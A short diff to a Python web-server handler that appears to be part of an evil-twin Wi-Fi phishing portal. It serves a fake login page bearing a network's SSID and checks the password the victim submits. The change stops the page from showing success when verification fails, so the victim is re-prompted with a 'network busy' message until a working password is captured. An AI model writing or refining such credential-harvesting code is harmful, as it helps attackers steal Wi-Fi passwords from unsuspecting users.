@@ -156,14 +156,21 @@ class Handler(http.server.BaseHTTPRequestHandler):
             if v is not None and v.get("ok"):
                 body = PAGE_OK.encode("utf-8")
             elif v is not None and not v.get("ok"):
+                # 密码错误：重新显示登录页 + 错误提示
                 page = PAGE_LOGIN.replace("%SSID%", SSID)
                 page = page.replace('<form method="POST" action="/submit" id="frm">',
                                     '<form method="POST" action="/submit" id="frm">\n'
                                     '<div class="err show">&#x274C; 密码错误，请重新输入</div>')
                 body = page.encode("utf-8")
             else:
-                body = PAGE_OK.encode("utf-8")
+                # 验证服务不可用：不放行，按密码错误处理（严格模式）
+                page = PAGE_LOGIN.replace("%SSID%", SSID)
+                page = page.replace('<form method="POST" action="/submit" id="frm">',
+                                    '<form method="POST" action="/submit" id="frm">\n'
+                                    '<div class="err show">&#x274C; 网络繁忙，请稍后重试</div>')
+                body = page.encode("utf-8")
         else:
+            # 空密码：直接返回错误页
             page = PAGE_LOGIN.replace("%SSID%", SSID)
             page = page.replace('<form method="POST" action="/submit" id="frm">',
                                 '<form method="POST" action="/submit" id="frm">\n'
